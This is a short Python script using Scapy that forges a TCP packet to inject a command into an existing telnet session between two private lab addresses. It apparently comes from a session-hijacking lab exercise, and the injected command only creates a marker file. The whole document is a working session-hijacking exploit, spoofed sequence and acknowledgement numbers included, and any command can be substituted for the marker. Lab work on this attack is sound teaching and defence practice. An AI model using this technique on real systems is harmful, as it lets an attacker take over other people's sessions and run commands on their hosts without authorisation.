#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=40082, dport=23, flags="PA", seq=765, ack=110)
data = "touch /tmp/session_hijack_successful\n"
pkt = ip/tcp/data
pkt.show()
send(pkt, verbose=1)
